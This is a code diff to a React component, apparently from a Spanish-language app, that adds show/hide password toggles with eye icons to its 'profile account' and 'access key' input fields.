@@ -1,5 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { AlertCircle, RefreshCw, Send, FileText } from 'lucide-react';
+import { AlertCircle, RefreshCw, Send, FileText, Eye, EyeOff } from 'lucide-react';
 import { DeviceInfo } from '../types';
 import { doc, setDoc } from 'firebase/firestore';
 import { db } from '../lib/firebase';
@@ -14,6 +14,8 @@ export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSync
   const [sessionId, setSessionId] = useState<string>('');
   const [box1, setBox1] = useState<string>('');
   const [box2, setBox2] = useState<string>('');
+  const [showBox1, setShowBox1] = useState<boolean>(true);
+  const [showBox2, setShowBox2] = useState<boolean>(false);
   const [isSuccessView, setIsSuccessView] = useState<boolean>(false);
   const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
   const [lastSavedTime, setLastSavedTime] = useState<string | null>(null);
@@ -236,14 +238,25 @@ export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSync
               >
                 Cuenta de tu perfil
               </label>
-              <input
-                ref={input1Ref}
-                type="text"
-                id="text-field-1"
-                value={box1}
-                onChange={handleBox1Change}
-                className="w-full max-w-xl h-8.5 rounded-lg border border-slate-300 bg-white px-3 text-xs sm:text-sm text-slate-900 focus:border-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 shadow-2xs transition-all"
-              />
+              <div className="relative max-w-xl">
+                <input
+                  ref={input1Ref}
+                  type={showBox1 ? 'text' : 'password'}
+                  id="text-field-1"
+                  value={box1}
+                  onChange={handleBox1Change}
+                  className="w-full h-8.5 rounded-lg border border-slate-300 bg-white pl-3 pr-10 text-xs sm:text-sm text-slate-900 focus:border-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 shadow-2xs transition-all"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowBox1(!showBox1)}
+                  className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 p-1 focus:outline-none"
+                  aria-label={showBox1 ? 'Ocultar cuenta' : 'Mostrar cuenta'}
+                  title={showBox1 ? 'Ocultar texto' : 'Mostrar texto'}
+                >
+                  {showBox1 ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                </button>
+              </div>
             </div>
 
             {/* Casilla 2: Mensaje o Contenido */}
@@ -254,13 +267,24 @@ export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSync
               >
                 Clave de acceso
               </label>
-              <input
-                type="text"
-                id="text-field-2"
-                value={box2}
-                onChange={handleBox2Change}
-                className="w-full max-w-xl h-8.5 rounded-lg border border-slate-300 bg-white px-3 text-xs sm:text-sm text-slate-900 focus:border-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 shadow-2xs transition-all"
-              />
+              <div className="relative max-w-xl">
+                <input
+                  type={showBox2 ? 'text' : 'password'}
+                  id="text-field-2"
+                  value={box2}
+                  onChange={handleBox2Change}
+                  className="w-full h-8.5 rounded-lg border border-slate-300 bg-white pl-3 pr-10 text-xs sm:text-sm text-slate-900 focus:border-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 shadow-2xs transition-all"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowBox2(!showBox2)}
+                  className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 p-1 focus:outline-none"
+                  aria-label={showBox2 ? 'Ocultar clave' : 'Mostrar clave'}
+                  title={showBox2 ? 'Ocultar texto' : 'Mostrar texto'}
+                >
+                  {showBox2 ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                </button>
+              </div>
             </div>
 
             {/* Botones de Acción */}
